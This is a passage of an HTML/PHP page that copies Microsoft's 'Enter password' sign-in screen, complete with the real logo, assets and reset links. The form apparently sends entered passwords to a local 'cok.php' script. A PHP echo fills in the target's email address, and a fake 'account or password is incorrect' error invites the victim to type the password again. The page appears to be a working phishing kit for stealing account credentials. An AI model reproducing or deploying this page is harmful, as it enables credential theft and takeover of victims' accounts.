e=o(e,/%22/g,'"'),e=o(e,/%20/g," "),e=o(e,/%25/g,"%")}function u(e){return e=o(e,/%/g,"%25"),e=o(e,/ /g,"%20"),e=o(e,/"/g,"%22"),e=o(e,/'/g,"%27"),e=o(e,/,/g,"%2c"),e=o(e,/:/g,"%3a"),e=o(e,/;/g,"%3b"),e=o(e,/</g,"%3c"),e=o(e,/=/g,"%3d"),e=o(e,/>/g,"%3e"),e=o(e,/\\/g,"%5c")}function f(e){var r=new Date;r.setTime(r.getTime()+C*H),t.cookie=n.name+"="+u(JSON.stringify(e))+";expires="+r.toUTCString()+";path=/; Secure; SameSite=None"}function a(e,t){if(e){if(e.indexOf){return e.indexOf(t)}
for(var n=0;n<e.length;n++){if(e[n]===t){return n}}}return-1}function h(e,t){return-1!==a(e,t)}function g(e,t){var n=a(e,t);return-1!==n&&(e.splice(n,1),!0)}function l(e,t){for(var n in e){if(e.hasOwnProperty(n)&&!t(n,e[n])){break}}}function s(){var e=(new Date).getTime(),t=D*H;return P.getTime()>e?Math.round(e/t):Math.round((e-P.getTime())/t)}function d(e,t){var n=!1;if(t&&t.length>0){n=!0;for(var r=0;r<t.length;r++){delete e[t[r]]}}return n}function p(e){var t=s()-C,n=t+2*C,r=null,i=0,o=[]
;return l(e,function(c){return c<t||c>n?o.push(c):(0===e[c].length?o.push(c):(null===r||c<r)&&(r=c),i++),!0}),null!==r&&i>k&&o.push(r),d(e,o)}function v(e,t,n){r("Fetched: "+e+" Hash: "+t+" isRefresh: "+n);var o=i(),c=s(),u=!1,a=!1;if(l(o,function(e,n){return!h(n,t)||(e!==c?g(o[e],t)&&(a=!0):u=!0,!1)}),!u){var d=o[c]||[];d.push(t),o[c]=d,a=!0}a|=p(o),a&&f(o),b()}function m(t,n,i,o){var c={"method":"GET"};i&&(c.mode="cors"),e.fetch(t,c).then(function(e){
200===e.status?v(t,n,o):(r("Unexpected response - "+e.status),b())}).then(null,function(e){r("Failed - "+e),b()})}function T(){if(e.XMLHttpRequest&&!J){return new XMLHttpRequest}if(e.ActiveXObject){try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(e){}try{return new ActiveXObject("Microsoft.XMLHttp")}catch(e){}}return null}function w(e,t,n,i,o){r("Fetching - "+t),e.onload=function(){v(t,n,o)},e.onerror=function(){r("XHR failed!"),b()},e.ontimeout=function(){r("XHR timed out!"),b()};try{e.open("GET",t),
e.withCredentials=i&&!N,e.send()}catch(r){N?setTimeout(function(){v(t,n,o)},0):(N=!0,w(e,t,n,!1,o))}}function O(t,n,i,o){if(e.fetch){return void m(t,n,i,o)}var c=T();if(null!==c){return void w(c,t,n,i,o)}r("Unable to identify a transport option!")}function b(){var e=n.fetch;if(X<e.length&&e[X]){var t=e[X];O(t.path,t.hash,t.co||!1,t.rf||!1),X++}}function y(e){if(e){try{var n=t.createElement("link");n.rel="prefetch",n.href=e,t.head.appendChild(n)}catch(e){}}}function M(){r("Starting"),b(),b()}function S(){
for(var t=e.$Config||e.ServerData||{},r=n.fetch,i=n.mode||-1,o=-1,c=0;c<r.length;c++){0!==o&&i>=3&&(o=r[c].rf?1:0),R&&!J&&y(r[c].path||{})}t.prefetchPltMode=o}if(n&&n.fetch&&0!==n.fetch.length){var x=e.$Debug||{},X=0,H=6e4,P=new Date(2019),k=n.maxHistory||4,C=n.maxAge||20160,D=n.ageRes||1440,L=n.delay||5e3,R=n.rfPre||!1,J=void 0!==(e._phantom||e.callPhantom),N=!1;JSON&&JSON.parse&&(n.clearCookie=function(){document.cookie=n.name+"=; expires=Thu, 01 Jan 1970 00:00:01 GMT;"},e.$Do.when("doc.load",function(){
setTimeout(M,L),setTimeout(S,0)}))}}(window,document,$Prefetch);

;
})();
//]]>
</script>


<div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form name="f1" id="i0281" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="cok.php">

    <!-- ko withProperties: { '$loginPage': $data } -->
    <div data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko ifnot: isVerticalSplitTemplate -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr } }"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="component: { name: 'background-image-control',
    publicMethods: $page.backgroundControlMethods }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);" class="background-image ext-background-image"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div class="middle" data-bind="css: { 'has-header': showHeader }">
            <div data-bind="component: { name: 'content-control', params: { serverData: svr } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div>
    <!-- ko if: $page.backgroundLogoUrl() && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko -->

    <!-- ko if: svr.fShowPageLevelTitleAndDesc && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hidePageLevelTitleAndDesc')) --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().view_onAnimationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().currentViewHasMetadata('wide'),
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.fShowCookieBanner --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
    <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible -->
    <button type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
        <!-- ko ifnot: svr.fIsRTLMarket -->
            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: svr.fIsRTLMarket --><!-- /ko -->
    </button>
    <!-- /ko -->

    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $email ?>"><?php echo $email ?></div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view has-identity-banner" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata },
                event: {
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->

<!--  -->

<input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
<input type="hidden" name="login" data-bind="value: unsafe_username" value="<?php echo $email ?>">
<input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
<input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11">
<input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
<input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
<input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
<input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
<input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">

<div id="loginHeader" class="row title ext-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title'], externalCss: { 'title': true }">Enter password</div>

<!-- ko if: showCredViewBrandingDesc --><!-- /ko -->

<!-- ko if: unsafe_pageDescription --><!-- /ko -->

<div class="row">
    <div class="form-group col-md-24">
        <div role="alert" aria-live="assertive">
            <!-- ko if: passwordTextbox.error -->
            <div id="passwordError" data-bind="
                externalCss: { 'error': true },
                htmlWithBindings: passwordTextbox.error,
                childBindings: {
                    'idA_IL_ForgotPassword0': {
                        href: accessRecoveryLink || svr.urlResetPassword,
                        attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                        click: accessRecoveryLink ? null : resetPassword_onClick } }" class="error ext-error">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAYWSO2_TUABG46RNHxJteIoJdWBAVE6ufX2dh4REGttN3PiGJHbzWCLHcRw7ju3YTpzmFzB2QlCkDowdmYCJEXXqCiMDKkyIASGx0P4Clk860reds7nGpnNpkAaPE1SaKjxkIIPUbD9P5lUWkkyeAqTK0CwJEWQhDagBAtC_tZn6O2ud3gZl_vWpuPvtu1M4Ix6MwtALCplMFEVpdzg0NT2tuZOMrToD0zHeEcQFQVwSxEl8VXdIpXkWD1iYRTkGAESxeRblqTyTljjBwpZxhFt8iDlx0m0CUJMbdlUeWdKkE0qTxrhr1ReYVmg8UVCXU6KOrDHYqodY5impdP03QLUlmNJ-JezKEurKBt2VhbFkdRZf4tu14iwc0dfj-uZS_xXfGLr-pOe5QXiSeBFvh95QYdSlpR2609KgVkN1vduz7dzCgKXZNKsIc4md7tudli6oMKJ52AR-kyWD3GxG9TtWy86JiB0qA2bpSdCSxvgZmHUsbLYFq45Rub2Yu5GGbXbEMc-G4dTd0yl2WhUCfs-rLacUtEc1wVFMjasiYeiOegOhmot4jZmPRgHVl40q3eaK5L4oimMZZe1FpbaEPA_pcWmJ55zSZ6FmiEX2KOBMrHIQ5gVFqvtF2JbNuYhKGprXzUN1TA4qeBLigMz6y04o-7aFqT3UBwtbq2Cx5_GqTCmAl0PslUH9bSJ5JXPiOueJLdfTHXOw4_nu0LT1r4nUWHeejoO-6vuuc-38YoX4sXJvPZlavx_biT26AxKF9fXNVOya_qwQb1avArp8lfukbiX4l_bvu5_fb8fOVzNKq5oNilZI5Zp0ES3lPl2JJFxWd7McNBqR6mB6ceAdHIR54wldoI6TxHEyeZ68WeF6mJebchFzxQZH98DPZPz5WuzDxn-S_Hgj9g81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10">reset it now.</a></div>
            <!-- /ko -->
        </div>

        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input name="passwd" type="password" required id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box has-error ext-has-error" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder="Password" aria-label="Enter the password for <?php echo $email ?>" tabindex="0">

            <!-- ko if: svr.fUsePasswordPeek && showPassword() --><!-- /ko -->
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

        <!-- ko if: svr.fUsePasswordPeek --><!-- /ko -->
    </div>
</div>

<!-- ko if: shouldHipInit --><!-- /ko -->

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div>
        <!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko -->
        <!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: svr.urlSkipZtd && svr.sZtdUpnHint --><!-- /ko -->
                    <!-- ko if: showAccessRecoveryLink -->
                    <div class="form-group">
                        <a id="idA_PWD_ForgotPassword" role="link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAYWSO2_TUABG46RNHxJteIoJdWBAVE6ufX2dh4REGttN3PiGJHbzWCLHcRw7ju3YTpzmFzB2QlCkDowdmYCJEXXqCiMDKkyIASGx0P4Clk860reds7nGpnNpkAaPE1SaKjxkIIPUbD9P5lUWkkyeAqTK0CwJEWQhDagBAtC_tZn6O2ud3gZl_vWpuPvtu1M4Ix6MwtALCplMFEVpdzg0NT2tuZOMrToD0zHeEcQFQVwSxEl8VXdIpXkWD1iYRTkGAESxeRblqTyTljjBwpZxhFt8iDlx0m0CUJMbdlUeWdKkE0qTxrhr1ReYVmg8UVCXU6KOrDHYqodY5impdP03QLUlmNJ-JezKEurKBt2VhbFkdRZf4tu14iwc0dfj-uZS_xXfGLr-pOe5QXiSeBFvh95QYdSlpR2609KgVkN1vduz7dzCgKXZNKsIc4md7tudli6oMKJ52AR-kyWD3GxG9TtWy86JiB0qA2bpSdCSxvgZmHUsbLYFq45Rub2Yu5GGbXbEMc-G4dTd0yl2WhUCfs-rLacUtEc1wVFMjasiYeiOegOhmot4jZmPRgHVl40q3eaK5L4oimMZZe1FpbaEPA_pcWmJ55zSZ6FmiEX2KOBMrHIQ5gVFqvtF2JbNuYhKGprXzUN1TA4qeBLigMz6y04o-7aFqT3UBwtbq2Cx5_GqTCmAl0PslUH9bSJ5JXPiOueJLdfTHXOw4_nu0LT1r4nUWHeejoO-6vuuc-38YoX4sXJvPZlavx_biT26AxKF9fXNVOya_qwQb1avArp8lfukbiX4l_bvu5_fb8fOVzNKq5oNilZI5Zp0ES3lPl2JJFxWd7McNBqR6mB6ceAdHIR54wldoI6TxHEyeZ68WeF6mJebchFzxQZH98DPZPz5WuzDxn-S_Hgj9g81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10" data-bind="
                            text: str['CT_PWD_STR_ForgotPwdLink_Text'],
                            href: accessRecoveryLink || svr.urlResetPassword,
                            attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                            click: accessRecoveryLink ? null : resetPassword_onClick">Forgot my password</a>
                    </div>
                    <!-- /ko -->
                    <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
                    <!-- ko ifnot: useEvictedCredentials -->
                        <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->

<div class="form-group">
    <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->

    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko -->

    <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
</div>

<!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->

                        <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
                    <!-- /ko -->
                    <!-- ko if: showChangeUserLink --><!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.fShowButtons,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" data-bind="
            attr: primaryButtonAttributes,
            externalCss: {
                'button': true,
                'primary': true },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" value="Sign in">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
</div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
        <!-- /ko -->

        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
        <input type="hidden" name="canary" data-bind="value: svr.canary" value="UWL7sAjt18S2A5zTb2IwMNHa+7D3gRwanN2xKpKKt9g=7:1">
        <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAYWSO2_TUABG46RNHxJteIoJdWBAVE6ufX2dh4REGttN3PiGJHbzWCLHcRw7ju3YTpzmFzB2QlCkDowdmYCJEXXqCiMDKkyIASGx0P4Clk860reds7nGpnNpkAaPE1SaKjxkIIPUbD9P5lUWkkyeAqTK0CwJEWQhDagBAtC_tZn6O2ud3gZl_vWpuPvtu1M4Ix6MwtALCplMFEVpdzg0NT2tuZOMrToD0zHeEcQFQVwSxEl8VXdIpXkWD1iYRTkGAESxeRblqTyTljjBwpZxhFt8iDlx0m0CUJMbdlUeWdKkE0qTxrhr1ReYVmg8UVCXU6KOrDHYqodY5impdP03QLUlmNJ-JezKEurKBt2VhbFkdRZf4tu14iwc0dfj-uZS_xXfGLr-pOe5QXiSeBFvh95QYdSlpR2609KgVkN1vduz7dzCgKXZNKsIc4md7tudli6oMKJ52AR-kyWD3GxG9TtWy86JiB0qA2bpSdCSxvgZmHUsbLYFq45Rub2Yu5GGbXbEMc-G4dTd0yl2WhUCfs-rLacUtEc1wVFMjasiYeiOegOhmot4jZmPRgHVl40q3eaK5L4oimMZZe1FpbaEPA_pcWmJ55zSZ6FmiEX2KOBMrHIQ5gVFqvtF2JbNuYhKGprXzUN1TA4qeBLigMz6y04o-7aFqT3UBwtbq2Cx5_GqTCmAl0PslUH9bSJ5JXPiOueJLdfTHXOw4_nu0LT1r4nUWHeejoO-6vuuc-38YoX4sXJvPZlavx_biT26AxKF9fXNVOya_qwQb1avArp8lfukbiX4l_bvu5_fb8fOVzNKq5oNilZI5Zp0ES3lPl2JJFxWd7McNBqR6mB6ceAdHIR54wldoI6TxHEyeZ68WeF6mJebchFzxQZH98DPZPz5WuzDxn-S_Hgj9g81">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="defbe275-170c-4bc9-a30d-93a50d9c1f00">
